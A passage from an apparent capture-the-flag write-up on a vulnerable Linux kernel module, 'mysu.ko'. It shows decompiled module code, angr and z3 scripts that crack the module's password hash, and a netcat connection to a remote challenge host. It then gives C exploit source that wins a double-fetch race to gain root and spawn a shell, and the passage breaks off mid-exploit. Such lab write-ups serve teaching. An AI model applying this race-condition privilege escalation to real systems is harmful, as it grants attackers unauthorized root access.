+  <span class="mtk1">majorNumber</span> <span class="mtk5">=</span> <span class="mtk8">__register_chrdev</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk5">0x</span><span class="mtk6">100</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">DAT_001003b6,</span> <span class="mtk1">fops);</span>
+
+  <span class="mtk5">if</span> <span class="mtk1">(majorNumber</span> <span class="mtk5">&lt;</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
+    <span class="mtk8">printk</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">DAT_001003c0);</span>
+    <span class="mtk1">mysuDevice._0_4_</span> <span class="mtk5">=</span> <span class="mtk1">majorNumber;</span>
+  <span class="mtk1">}</span> <span class="mtk5">else</span> <span class="mtk1">{</span>
+    <span class="mtk8">printk</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">DAT_001003ea, majorNumber);</span>
+    <span class="mtk1">mysuClass</span> <span class="mtk5">=</span> <span class="mtk8">__class_create</span><span class="mtk1">(__this_module,</span> <span class="mtk5">&amp;</span><span class="mtk1">DAT_001003b6,</span> <span class="mtk5">&amp;</span><span class="mtk1">__key.</span><span class="mtk6">25383</span><span class="mtk1">);</span>
+
+    <span class="mtk5">if</span> <span class="mtk1">(mysuClass</span> <span class="mtk5">&lt;</span> <span class="mtk5">0x</span><span class="mtk6">fffffffffffff001</span><span class="mtk1">)</span> <span class="mtk1">{</span>
+      <span class="mtk8">printk</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100438);</span>
+      <span class="mtk1">mysuDevice</span> <span class="mtk5">=</span> <span class="mtk8">device_create</span><span class="mtk1">(mysuClass,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk1">majorNumber</span> <span class="mtk5">&lt;&lt;</span> <span class="mtk5">0x</span><span class="mtk6">14</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">DAT_001003b6);</span>  
+      <span class="mtk1">mysuDevice._0_4_</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
+
+      <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">fffffffffffff000</span> <span class="mtk5">&lt;</span> <span class="mtk1">mysuDevice)</span> <span class="mtk1">{</span>
+        <span class="mtk8">class_destroy</span><span class="mtk1">(mysuClass);</span>
+        <span class="mtk8">__unregister_chrdev</span><span class="mtk1">(majorNumber,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk5">0x</span><span class="mtk6">100</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">DAT_001003b6);</span>
+        <span class="mtk8">printk</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100468);</span>
+      <span class="mtk1">}</span>
+    <span class="mtk1">}</span> <span class="mtk5">else</span> <span class="mtk1">{</span>
+      <span class="mtk8">__unregister_chrdev</span><span class="mtk1">(majorNumber,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk5">0x</span><span class="mtk6">100</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">DAT_001003b6);</span>
+      <span class="mtk8">printk</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">DAT_00100408);</span>
+      <span class="mtk1">mysuDevice._0_4_</span> <span class="mtk5">=</span> <span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1">)</span> <span class="mtk1">mysuClass;</span>
+    <span class="mtk1">}</span>
+  <span class="mtk1">}</span>
+
+  <span class="mtk5">return</span> <span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1">) mysuDevice;</span>
+<span class="mtk1">}</span>
+</code></pre></div><h2 id="exploit-development">Exploit development</h2><p>Let&rsquo;s run the script we have to start the kernel emulation:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">./run.sh</span>
+SeaBIOS (version 1.13.0-1ubuntu1.1)
+
+
+iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+07F8C8B0+07ECC8B0 CA00  
+
+
+
+Booting from ROM..
+/ $ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+/ $ ls
+<span class="code-blue">bin</span>      flag     <span class="code-blue">lib      media    opt      run      tmp</span>
+<span class="code-blue">dev      home     <span class="code-cyan">lib64</span>    mnt      proc     sbin     usr</span>
+<span class="code-blue">etc      <span class="code-green">init     <span class="code-cyan">linuxrc</span></span></span>  mysu.ko  <span class="code-blue">root     sys      var</span>
+</code></pre></div><p>We have access as <code>user</code> (UID 1000). First of all, we need to get the expected hash to find a valid password. We can use <code>dd</code> from <code>/dev/mysu</code> to extract the <code>users</code> variable we saw before:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/ $ find / -name \*mysu\* 2>/dev/null
+/sys/class/mysu
+/sys/class/mysu/mysu
+/sys/devices/virtual/mysu
+/sys/devices/virtual/mysu/mysu
+/sys/module/mysu
+/mysu.ko
+/dev/mysu
+/ $ ls -l /dev/mysu
+crw-rw-rw-    1 root     root      248,   0 May  2 00:32 <span class="code-magenta">/dev/mysu</span>
+/ $ dd if=/dev/mysu count=1 | xxd
+0+1 records in
+0+1 records out
+00000000: e803 0000 0000 0000 e903 0000 0000 0000  ................  
+00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+</code></pre></div><p>The expected hash is all zeroes, as said in <code>notes.txt</code>. This is the <code>hash</code> function:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">uint</span> <span class="mtk8">hash</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk9 mtki">param_1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
+  <span class="mtk7 mtki">uint</span> <span class="mtk1">uVar1;</span>
+  <span class="mtk7 mtki">size_t</span> <span class="mtk1">sVar2;</span>
+  <span class="mtk7 mtki">uint</span> <span class="mtk1">local_14;</span>
+  <span class="mtk7 mtki">size_t</span> <span class="mtk1">local_10;</span>
+
+  <span class="mtk1">local_10</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
+  <span class="mtk1">local_14</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
+  <span class="mtk1">sVar2</span> <span class="mtk5">=</span> <span class="mtk8">strlen</span><span class="mtk1">(param_1);</span>
+
+  <span class="mtk5">for</span> <span class="mtk1">(;</span> <span class="mtk1">local_10</span> <span class="mtk5">!=</span> <span class="mtk1">sVar2;</span> <span class="mtk1">local_10</span> <span class="mtk5">=</span> <span class="mtk1">local_10</span> <span class="mtk5">+</span> <span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
+    <span class="mtk1">uVar1</span> <span class="mtk5">=</span> <span class="mtk1">(local_14</span> <span class="mtk5">+</span> <span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1">)param_1[local_10])</span> <span class="mtk5">*</span> <span class="mtk5">0x</span><span class="mtk6">401</span><span class="mtk1">;</span>
+    <span class="mtk1">local_14</span> <span class="mtk5">=</span> <span class="mtk1">uVar1</span> <span class="mtk5">^</span> <span class="mtk1">uVar1</span> <span class="mtk5">&gt;&gt;</span> <span class="mtk6">6</span> <span class="mtk5">^</span> <span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1">)param_1[local_10];</span>  
+  <span class="mtk1">}</span>
+
+  <span class="mtk5">return</span> <span class="mtk1">local_14;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Obviously, if we provide a password that only has null bytes, we will get a hash that is null as well. So we have everything needed to build the exploit.</p><p>Nevertheless, this local instance is read-only, so we can&rsquo;t write the exploit in it and therefore we can&rsquo;t exploit it.</p><p>Hence, we must do everything inside the remote instance. Let&rsquo;s connect and get a proper TTY:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> 157.245.46.51 30193
+warning: TCG doesn't support requested feature: CPUID.01H:ECX.vmx [bit 5]  
+warning: TCG doesn't support requested feature: CPUID.01H:ECX.vmx [bit 5]
+/ $ ^Z
+zsh: suspended  nc 157.245.46.51 30193
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  nc 157.245.46.51 30193
+                                        reset xterm
+/ $ export TERM=xterm
+/ $ export SHELL=bash
+/ $ stty rows 50 columns 158
+</code></pre></div><p>As a sanity check, we must verify that we can write inside <code>/tmp</code>, that we have a text editor such as <code>vi</code> or <code>nano</code> and that the libraries needed by the exploit are installed in the system:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/ $ ls -la /tmp
+total 0
+drwxrwxrwt    2 root     root            40 Nov 10  2019 <span class="code-blue">.</span>
+drwxr-xr-x   18 root     root           460 Dec 10  2019 <span class="code-blue">..</span>
+/ $ which vi
+/bin/vi
+/ $ ls /lib
+ls /lib
+<span class="code-green">ld-2.28.so            libdl-2.28.so         <span class="code-cyan">libnss_files.so.2</span></span>
+<span class="code-cyan">ld-linux-x86-64.so.2  libdl.so.2            <span class="code-green">libpthread-2.28.so</span></span>  
+<span class="code-green">libanl-2.28.so</span>        libgcc_s.so           <span class="code-cyan">libpthread.so.0</span>
+<span class="code-cyan">libanl.so.1</span>           libgcc_s.so.1         <span class="code-green">libresolv-2.28.so</span>
+<span class="code-cyan">libatomic.so          <span class="code-green">libm-2.28.so</span>          libresolv.so.2</span>
+<span class="code-cyan">libatomic.so.1        libm.so.6             <span class="code-green">librt-2.28.so</span></span>
+<span class="code-green">libatomic.so.1.2.0    libmvec-2.28.so       <span class="code-cyan">librt.so.1</span></span>
+<span class="code-green">libc-2.28.so          <span class="code-cyan">libmvec.so.1</span>          libutil-2.28.so</span>
+<span class="code-cyan">libc.so.6             <span class="code-green">libnss_dns-2.28.so</span>    libutil.so.1</span>
+<span class="code-green">libcrypt-2.28.so      <span class="code-cyan">libnss_dns.so.2       <span class="code-blue">modules</span></span></span>
+<span class="code-cyan">libcrypt.so.1         <span class="code-green">libnss_files-2.28.so</span></span>
+</code></pre></div><h3 id="password-hash-cracking">Password hash cracking</h3><p>Now we will find the expected hash:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/ $ dd if=/dev/mysu bs=100 count=1 | xxd
+00000000: e803 0000 759f 3103 e903 0000 6764 b72a  ....u.1.....gd.*  
+00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+</code></pre></div><p>So the expected hash is <code>"\x75\x9f\x31\x03"</code>, which is <code>0x03319f75</code> in hexadecimal format. In order to obtain a valid password, we must use the same hashing function found in the <code>mysu.ko</code> module. We may write a script like this to check if a given password results in the expected hash:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#include</span> <span class="mtk4">&lt;stdio.h&gt;</span>
+<span class="mtk5">#include</span> <span class="mtk4">&lt;string.h&gt;</span>
+<span class="mtk5">#include</span> <span class="mtk4">&lt;unistd.h&gt;</span>
+
+<span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">int</span> <span class="mtk8">hash</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk9 mtki">string</span><span class="mtk1">)</span> <span class="mtk1">{</span>
+  <span class="mtk7 mtki">int</span> <span class="mtk1">i;</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">int</span> <span class="mtk1">aux;</span>
+  <span class="mtk7 mtki">unsigned</span> <span class="mtk7 mtki">int</span> <span class="mtk1">res;</span>
+
+  <span class="mtk1">res</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
+
+  <span class="mtk5">for</span> <span class="mtk1">(i</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span> <span class="mtk1">i</span> <span class="mtk5">&lt;</span> <span class="mtk8">strlen</span><span class="mtk1">(string);</span> <span class="mtk1">i</span><span class="mtk5">++</span><span class="mtk1">)</span> <span class="mtk1">{</span>  
+    <span class="mtk1">aux</span> <span class="mtk5">=</span> <span class="mtk1">(res</span> <span class="mtk5">+</span> <span class="mtk1">string[i])</span> <span class="mtk5">*</span> <span class="mtk5">0x</span><span class="mtk6">401</span><span class="mtk1">;</span>
+    <span class="mtk1">res</span> <span class="mtk5">=</span> <span class="mtk1">aux</span> <span class="mtk5">^</span> <span class="mtk1">aux</span> <span class="mtk5">&gt;&gt;</span> <span class="mtk6">6</span> <span class="mtk5">^</span> <span class="mtk1">string[i];</span>
+  <span class="mtk1">}</span>
+
+  <span class="mtk5">return</span> <span class="mtk1">res;</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">int</span> <span class="mtk8">main</span><span class="mtk1">()</span> <span class="mtk1">{</span>
+  <span class="mtk7 mtki">char</span> <span class="mtk1">password[</span><span class="mtk6">8</span><span class="mtk1">];</span>
+  <span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk1">password,</span> <span class="mtk6">8</span><span class="mtk1">);</span>
+
+  <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">hash</span><span class="mtk1">(password)</span> <span class="mtk5">==</span> <span class="mtk5">0x</span><span class="mtk6">03319f75</span><span class="mtk1">)</span> <span class="mtk1">{</span>
+    <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Correct"</span><span class="mtk1">);</span>
+  <span class="mtk1">}</span> <span class="mtk5">else</span> <span class="mtk1">{</span>
+    <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Wrong"</span><span class="mtk1">);</span>
+  <span class="mtk1">}</span>
+
+  <span class="mtk5">return</span> <span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>The way of getting a valid password is basically brute force. However, the password is 8 bytes long ($2^{64}$ possibilities), which will be very time-consuming to do it in a naïve way. To improve the process, we can use <code>angr</code>, which comes with some solvers and other black magic.</p><p>Basically, we must use a Python script like this one:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span> <span class="mtk8 mtku">angr</span>
+
+<span class="mtk1">project</span> <span class="mtk5">=</span> <span class="mtk8 mtku">angr</span><span class="mtk1">.Project(</span><span class="mtk4">'./hash'</span><span class="mtk1">)</span>
+<span class="mtk1">state</span> <span class="mtk5">=</span> <span class="mtk1">project</span><span class="mtk1">.factory.entry_state()</span>
+
+<span class="mtk1">simmgr</span> <span class="mtk5">=</span> <span class="mtk1">project</span><span class="mtk1">.factory.simulation_manager(</span><span class="mtk1">state</span><span class="mtk1">)</span>
+<span class="mtk1">simmgr</span><span class="mtk1">.explore(</span><span class="mtk9 mtki">find</span><span class="mtk5">=</span><span class="mtk7 mtki">lambda</span> <span class="mtk9 mtki">state</span><span class="mtk1">:</span> <span class="mtk7 mtki">b</span><span class="mtk4">'Correct</span><span class="mtk6">\n</span><span class="mtk4">'</span> <span class="mtk5">in</span> <span class="mtk9 mtki">state</span><span class="mtk1">.posix.dumps(</span><span class="mtk6">1</span><span class="mtk1">))</span>  
+
+<span class="mtk5">if</span> <span class="mtk1">simmgr</span><span class="mtk1">.found:</span>
+    <span class="mtk1">password</span> <span class="mtk5">=</span> <span class="mtk1">[]</span>
+
+    <span class="mtk5">for</span> <span class="mtk1">byte</span> <span class="mtk5">in</span> <span class="mtk1">simmgr</span><span class="mtk1">.found[</span><span class="mtk6">0</span><span class="mtk1">].posix.dumps(</span><span class="mtk6">0</span><span class="mtk1">):</span>
+        <span class="mtk1">password</span><span class="mtk1">.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">byte</span><span class="mtk1">))</span>
+
+    <span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">',</span> <span class="mtk4">'</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk1">password</span><span class="mtk1">))</span>
+</code></pre></div><p>And then run it to find a valid password (it might take a few seconds):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gcc</span> -no-pie <span class="mtku">hash.c</span> -o hash
+
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve_angr.py</span>
+WARNING | <span class="code-dark-green">angr.storage.memory_mixins.default_filler_mixin</span> | <span class="code-dark-green">The program is accessing memory with an unspecified value. This could indicate unwanted behavior.</span>
+WARNING | <span class="code-dark-green">angr.storage.memory_mixins.default_filler_mixin</span> | <span class="code-dark-green">angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:</span>
+WARNING | <span class="code-dark-green">angr.storage.memory_mixins.default_filler_mixin</span> | <span class="code-dark-green">1) setting a value to the initial state</span>
+WARNING | <span class="code-dark-green">angr.storage.memory_mixins.default_filler_mixin</span> | <span class="code-dark-green">2) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold null</span>
+WARNING | <span class="code-dark-green">angr.storage.memory_mixins.default_filler_mixin</span> | <span class="code-dark-green">3) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.</span>
+WARNING | <span class="code-dark-green">angr.storage.memory_mixins.default_filler_mixin</span> | <span class="code-dark-green">Filling memory at 0x7fffffffffeff9c with 4 unconstrained bytes referenced from 0x4010b9 (_start+0x9 in hash (0x4010b9))</span>
+WARNING | <span class="code-dark-green">angr.storage.memory_mixins.default_filler_mixin</span> | <span class="code-dark-green">Filling memory at 0x7fffffffffeff80 with 8 unconstrained bytes referenced from 0x59f660 (strlen+0x0 in libc.so.6 (0x9f660))</span>  
+0x6e, 0x63, 0x7b, 0x89, 0x0, 0x40, 0x40, 0x20
+</code></pre></div><p>There it is. Let&rsquo;s verify it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -ne <span class="code-dark-yellow">"\x6e\x63\x7b\x89\x00\x40\x40\x20"</span> | <span class="code-dark-green">./hash</span>  
+Correct
+</code></pre></div><p>Another way of cracking the hash is using <code>z3</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>
+
+<span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">z3</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8">BitVec</span><span class="mtk1">, </span><span class="mtk8">LShR</span><span class="mtk1">, </span><span class="mtk1">sat</span><span class="mtk1">, </span><span class="mtk8">SignExt</span><span class="mtk1">, </span><span class="mtk8 mtku">Solver</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">crack_hash</span><span class="mtk1">(</span><span class="mtk9 mtki">h</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk1">string</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk8">BitVec</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'s</span><span class="mtk6">{</span><span class="mtk1">i</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">)]</span>
+
+<span class="mtk1">    </span><span class="mtk1">res</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span>
+
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">string</span><span class="mtk1">)):</span>
+<span class="mtk1">        </span><span class="mtk1">aux</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk1">res</span><span class="mtk1"> </span><span class="mtk7">+</span><span class="mtk1"> </span><span class="mtk8">SignExt</span><span class="mtk1">(</span><span class="mtk6">24</span><span class="mtk1">, </span><span class="mtk1">string</span><span class="mtk1">[</span><span class="mtk1">i</span><span class="mtk1">])) </span><span class="mtk7">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">401</span>
+<span class="mtk1">        </span><span class="mtk1">res</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">aux</span><span class="mtk1"> </span><span class="mtk7">^</span><span class="mtk1"> </span><span class="mtk8">LShR</span><span class="mtk1">(</span><span class="mtk1">aux</span><span class="mtk1">, </span><span class="mtk6">6</span><span class="mtk1">) </span><span class="mtk7">^</span><span class="mtk1"> </span><span class="mtk8">SignExt</span><span class="mtk1">(</span><span class="mtk6">24</span><span class="mtk1">, </span><span class="mtk1">string</span><span class="mtk1">[</span><span class="mtk1">i</span><span class="mtk1">])</span>  
+
+<span class="mtk1">    </span><span class="mtk1">s</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Solver</span><span class="mtk1">()</span>
+
+<span class="mtk1">    </span><span class="mtk1">s</span><span class="mtk1">.</span><span class="mtk8">add</span><span class="mtk1">(</span><span class="mtk1">res</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk9 mtki">h</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">s</span><span class="mtk1">.</span><span class="mtk8">check</span><span class="mtk1">() </span><span class="mtk7">==</span><span class="mtk1"> </span><span class="mtk1">sat</span><span class="mtk1">:</span>
+<span class="mtk1">        </span><span class="mtk1">m</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">s</span><span class="mtk1">.</span><span class="mtk8">model</span><span class="mtk1">()</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">bytes</span><span class="mtk1">(</span><span class="mtk1">m</span><span class="mtk1">[</span><span class="mtk1">x</span><span class="mtk1">].as_long() </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">x</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">string</span><span class="mtk1">)</span>
+
+<span class="mtk1">h</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">03319f75</span>
+<span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk8">crack_hash</span><span class="mtk1">(</span><span class="mtk1">h</span><span class="mtk1">))</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">crack_hash.py</span>
+b'\x18I\x95\xaf\x84\xaf\xf0\xa0'
+
+<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -ne <span class="code-dark-yellow">"\x18I\x95\xaf\x84\xaf\xf0\xa0"</span> | <span class="code-dark-green">./hash</span>  
+Correct
+</code></pre></div><p>We must be careful and use special <code>z3</code> functions such as <code>SignExt</code> because <code>char</code> type in C is signed, and <code>LShR</code> to use a logical bit-shift, rather than arithmetic.</p><h3 id="race-condition">Race condition</h3><p>Perfect. For the exploit, we are going to abuse a Double Fetch, so we need to be very fast in order to win the race. For that purpose, we will use two threads:</p><ul><li>One will be changing continuously the UID to 0 in our input data.</li><li>The other one will be changing continuously the UID to 1000 in our input data.</li></ul><p>There will be a moment when the module checks that the UID is 1000, we pass the check and then the UID changes to 0 before fetching again the user input data to call <code>prepare_creds</code> and <code>commit_creds</code>. Once we get UID 0, we stop both threads and spawn a shell with <code>system("/bin/sh")</code>.</p><p>This is the exploit source code in C:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#include</span> <span class="mtk4">&lt;fcntl.h&gt;</span>
+<span class="mtk5">#include</span> <span class="mtk4">&lt;pthread.h&gt;</span>
+<span class="mtk5">#include</span> <span class="mtk4">&lt;stdio.h&gt;</span>
+<span class="mtk5">#include</span> <span class="mtk4">&lt;stdlib.h&gt;</span>
+<span class="mtk5">#include</span> <span class="mtk4">&lt;unistd.h&gt;</span>
+
+<span class="mtk7 mtki">int</span> <span class="mtk1">done</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk7 mtki">char</span> <span class="mtk1">user_parameters</span><span class="mtk5">[]</span> <span class="mtk5">=</span> <span class="mtk1">{</span>
+  <span class="mtk5">0x</span><span class="mtk6">e8</span><span class="mtk1">,</span> <span class="mtk5">0x</span><span class="mtk6">03</span><span class="mtk1">,</span> <span class="mtk5">0x</span><span class="mtk6">00</span><span class="mtk1">,</span> <span class="mtk5">0x</span><span class="mtk6">00</span><span class="mtk1">,</span>
+  <span class="mtk5">0x</span><span class="mtk6">6e</span><span class="mtk1">,</span> <span class="mtk5">0x</span><span class="mtk6">63</span><span class="mtk1">,</span> <span class="mtk5">0x</span><span class="mtk6">7b</span><span class="mtk1">,</span> <span class="mtk5">0x</span><span class="mtk6">89</span><span class="mtk1">,</span>
+  <span class="mtk5">0x</span><span class="mtk6">00</span><span class="mtk1">,</span> <span class="mtk5">0x</span><span class="mtk6">40</span><span class="mtk1">,</span> <span class="mtk5">0x</span><span class="mtk6">40</span><span class="mtk1">,</span> <span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1">,</span>
+<span class="mtk1">};</span>
+
+<span class="mtk7 mtki">void</span><span class="mtk5">*</span> <span class="mtk8">change_uid_0</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk5">*</span> <span class="mtk9 mtki">arg</span><span class="mtk1">)</span> <span class="mtk1">{</span>
+  <span class="mtk7 mtki">int</span> <span class="mtk1">fd;</span>
+
+  <span class="mtk5">while</span> <span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk1">done)</span> <span class="mtk1">{</span>
+    <span class="mtk1">user_parameters[</span><span class="mtk6">0</span><span class="mtk1">]</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
+    <span class="mtk1">user_parameters[</span><span class="mtk6">1</span><span class="mtk1">]</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>
+
+    <span class="mtk1">fd</span> <span class="mtk5">=</span> <span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"/dev/mysu"</span><span class="mtk1">,</span> <span class="mtk1">O_RDWR);</span>
+    <span class="mtk8">write</span><span class="mtk1">(fd,</span> <span class="mtk1">user_parameters,</span> <span class="mtk5">sizeof</span><span class="mtk1">(user_parameters));</span>
+    <span class="mtk8">close</span><span class="mtk1">(fd);</span>
+
+    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">getuid</span><span class="mtk1">()</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
+      <span class="mtk1">done</span> <span class="mtk5">=</span> <span class="mtk6">1</span><span class="mtk1">;</span>
+      <span class="mtk8">system</span><span class="mtk1">(</span><span class="mtk4">"/bin/sh"</span><span class="mtk1">);</span>
+    <span class="mtk1">}</span>
+  <span class="mtk1">}</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">void</span><span class="mtk5">*</span> <span class="mtk8">change_uid_1000</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk5">*</span> <span class="mtk9 mtki">arg</span><span class="mtk1">)</span> <span class="mtk1">{</span>
+  <span class="mtk7 mtki">int</span> <span class="mtk1">fd;</span>
+
+  <span class="mtk5">while</span> <span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk1">done)</span> <span class="mtk1">{</span>
+    <span class="mtk1">user_parameters[</span><span class="mtk6">0</span><span class="mtk1">]</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">e8</span><span class="mtk1">;</span>
